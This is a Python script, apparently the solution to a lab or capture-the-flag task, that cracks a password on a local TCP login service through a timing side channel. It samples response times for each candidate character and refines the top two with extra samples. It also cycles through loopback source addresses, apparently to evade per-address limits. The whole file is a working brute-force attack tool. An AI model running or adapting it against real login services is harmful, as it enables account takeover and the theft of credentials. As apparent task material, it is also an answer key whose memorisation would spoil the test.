"""Timing-guided cracker that reads the leaked prefix signal from /opt/login.py."""

from __future__ import annotations

import argparse
import socket
import statistics
import string
import sys
import time
from pathlib import Path
from typing import Sequence

DEFAULT_CHARSET = (
    string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
)
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9876
DEFAULT_STAGE1_SAMPLES = 8
DEFAULT_STAGE2_SAMPLES = 40
DEFAULT_TOP_CANDIDATES = 12
DEFAULT_BOOST_BATCH = 30
DEFAULT_MAX_BOOST = 300
DEFAULT_CONFIDENCE = 0.004
DEFAULT_TRIM_RATIO = 0.1


def trimmed_mean(values: Sequence[float], trim_ratio: float = 0.1) -> float:
    """Discard a fraction of extreme values to mitigate jitter spikes."""
    if not values:
        raise ValueError("Cannot compute trimmed mean from empty sequence")
    values = sorted(values)
    n = len(values)
    trim = int(n * trim_ratio)
    if trim <= 0 or trim * 2 >= n:
        trimmed = values
    else:
        trimmed = values[trim:-trim]
    return statistics.mean(trimmed)


class PasswordFound(Exception):
    def __init__(self, password: str) -> None:
        super().__init__()
        self.password = password


class IPGenerator:
    """Generate a stream of unique loopback addresses (127.x.y.z)."""

    def __init__(self, start: int = 1) -> None:
        self._counter = start
        self._max = (1 << 24) - 2

    def next_ip(self) -> str:
        if self._counter > self._max:
            self._counter = 1
        value = self._counter
        self._counter += 1
        a = (value >> 16) & 0xFF
        b = (value >> 8) & 0xFF
        c = value & 0xFF
        return f"127.{a}.{b}.{c}"


def query_once(password: str, host: str, port: int, bind_ip: str | None) -> tuple[str, float]:
    """Send a single password guess; return the response and elapsed time."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if bind_ip:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((bind_ip, 0))
    start = time.perf_counter()
    sock.connect((host, port))
    sock.sendall(password.encode() + b"\n")
    response = sock.recv(1024).decode().strip()
    elapsed = time.perf_counter() - start
    sock.close()
    return response, elapsed


def measure_average(
    password: str,
    samples: int,
    ip_gen: IPGenerator,
    host: str,
    port: int,
    trim_ratio: float = 0.1,
    return_samples: bool = False,
) -> tuple[str, float, list[float]] | tuple[str, float]:
    timings: list[float] = []
    last_resp = "FAIL"
    for _ in range(samples):
        bind_ip = ip_gen.next_ip()
        resp, elapsed = query_once(password, host, port, bind_ip)
        last_resp = resp
        timings.append(elapsed)
        if resp == "OK":
            avg = trimmed_mean(timings, trim_ratio=trim_ratio)
            if return_samples:
                return resp, avg, timings
            return resp, avg
    avg = trimmed_mean(timings, trim_ratio=trim_ratio)
    if return_samples:
        return last_resp, avg, timings
    return last_resp, avg


def refine_top_two_candidates(
    prefix: str,
    best_char: str,
    runner_up: str,
    stats: dict[str, list[float]],
    ip_gen: IPGenerator,
    host: str,
    port: int,
    *,
    trim_ratio: float,
    boost_batch: int,
    max_boost: int,
    min_delta: float,
) -> str:
    if runner_up == best_char:
        return best_char

    best_timings = stats[best_char]
    runner_timings = stats[runner_up]
    best_score = trimmed_mean(best_timings, trim_ratio=trim_ratio)
    runner_score = trimmed_mean(runner_timings, trim_ratio=trim_ratio)
    total_boosted = 0

    while best_score - runner_score < min_delta and total_boosted < max_boost:
        for ch, storage in ((best_char, best_timings), (runner_up, runner_timings)):
            resp, _, new_timings = measure_average(
                prefix + ch,
                samples=boost_batch,
                ip_gen=ip_gen,
                host=host,
                port=port,
                trim_ratio=trim_ratio,
                return_samples=True,
            )
            if resp == "OK":
                raise PasswordFound(prefix + ch)
            storage.extend(new_timings)
        best_score = trimmed_mean(best_timings, trim_ratio=trim_ratio)
        runner_score = trimmed_mean(runner_timings, trim_ratio=trim_ratio)
        total_boosted += boost_batch

    return best_char if best_score >= runner_score else runner_up


def recover_password(
    *,
    length: int,
    charset: str,
    host: str,
    port: int,
    stage1_samples: int,
    stage2_samples: int,
    stage2_candidates: int,
    trim_ratio: float,
    boost_batch: int,
    max_boost: int,
    min_delta: float,
    ip_seed: int,
) -> str:
    ip_gen = IPGenerator(start=ip_seed)
    prefix = ""

    try:
        for position in range(length):
            sys.stdout.write(f"[*] Position {position + 1}/{length}: stage 1 sampling\n")
            sys.stdout.flush()
            stage1_scores: list[tuple[float, str]] = []
            for ch in charset:
                resp, avg = measure_average(
                    prefix + ch,
                    samples=stage1_samples,
                    ip_gen=ip_gen,
                    host=host,
                    port=port,
                    trim_ratio=trim_ratio,
                )
                if resp == "OK":
                    raise PasswordFound(prefix + ch)
                stage1_scores.append((avg, ch))
            stage1_scores.sort(reverse=True)
            candidates = [ch for (_, ch) in stage1_scores[:stage2_candidates]]

            sys.stdout.write(
                f"[*] Position {position + 1}/{length}: stage 2 re-sampling {len(candidates)} chars\n"
            )
            sys.stdout.flush()
            candidate_stats: dict[str, list[float]] = {}
            candidate_scores: list[tuple[float, str]] = []
            for ch in candidates:
                resp, avg, timings = measure_average(
                    prefix + ch,
                    samples=stage2_samples,
                    ip_gen=ip_gen,
                    host=host,
                    port=port,
                    trim_ratio=trim_ratio,
                    return_samples=True,
                )
                if resp == "OK":
                    raise PasswordFound(prefix + ch)
                candidate_scores.append((avg, ch))
                candidate_stats[ch] = timings

            candidate_scores.sort(reverse=True)
            best_char = candidate_scores[0][1]
            runner_up = candidate_scores[1][1] if len(candidate_scores) > 1 else best_char

            best_char = refine_top_two_candidates(
                prefix,
                best_char,
                runner_up,
                candidate_stats,
                ip_gen,
                host,
                port,
                trim_ratio=trim_ratio,
                boost_batch=boost_batch,
                max_boost=max_boost,
                min_delta=min_delta,
            )

            prefix += best_char
            sys.stdout.write(f"[+] Recovered prefix: {prefix!r}\n")
            sys.stdout.flush()

    except PasswordFound as complete:
        return complete.password
    return prefix


def write_password(path: str, password: str) -> None:
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(password)
    except PermissionError:
        fallback = Path("app/cracked.txt")
        fallback.write_text(password, encoding="utf-8")
        sys.stdout.write(
            f"[!] permission denied writing {path}; saved to {fallback}\n"
        )
        sys.stdout.flush()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Timing-based password recovery helper")
    parser.add_argument("--length", type=int, default=12, help="length of the secret")
    parser.add_argument(
        "--charset",
        default=DEFAULT_CHARSET,
        help="characters to try (default: ascii letters + digits + punctuation)",
    )
    parser.add_argument("--host", default=DEFAULT_HOST, help="target host")
    parser.add_argument(
        "--port", type=int, default=DEFAULT_PORT, help="target port"
    )
    parser.add_argument(
        "--stage1-samples",
        type=int,
        default=DEFAULT_STAGE1_SAMPLES,
        help="samples per character in the initial pass",
    )
    parser.add_argument(
        "--stage2-samples",
        type=int,
        default=DEFAULT_STAGE2_SAMPLES,
        help="samples per candidate in the refinement pass",
    )
    parser.add_argument(
        "--stage2-candidates",
        type=int,
        default=DEFAULT_TOP_CANDIDATES,
        help="how many top characters to re-evaluate in stage 2",
    )
    parser.add_argument(
        "--trim-ratio",
        type=float,
        default=DEFAULT_TRIM_RATIO,
        help="trim ratio when computing trimmed mean",
    )
    parser.add_argument(
        "--boost-batch",
        type=int,
        default=DEFAULT_BOOST_BATCH,
        help="extra samples per candidate when boosting the top-two comparison",
    )
    parser.add_argument(
        "--max-boost",
        type=int,
        default=DEFAULT_MAX_BOOST,
        help="maximum extra samples to append during the boost phase",
    )
    parser.add_argument(
        "--confidence-delta",
        type=float,
        default=DEFAULT_CONFIDENCE,
        help="minimum trimmed-mean gap before accepting the winning candidate",
    )
    parser.add_argument(
        "--output",
        default="/app/cracked.txt",
        help="file to write the recovered password into",
    )
    parser.add_argument(
        "--ip-seed",
        type=int,
        default=1,
        help="starting offset within the 127.0.0.0/8 loopback block",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    password = recover_password(
        length=args.length,
        charset=args.charset,
        host=args.host,
        port=args.port,
        stage1_samples=args.stage1_samples,
        stage2_samples=args.stage2_samples,
        stage2_candidates=args.stage2_candidates,
        trim_ratio=args.trim_ratio,
        boost_batch=args.boost_batch,
        max_boost=args.max_boost,
        min_delta=args.confidence_delta,
        ip_seed=args.ip_seed,
    )
    write_password(args.output, password)
    print(f"[OK] Secret recovered ({len(password)} chars) and written to {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
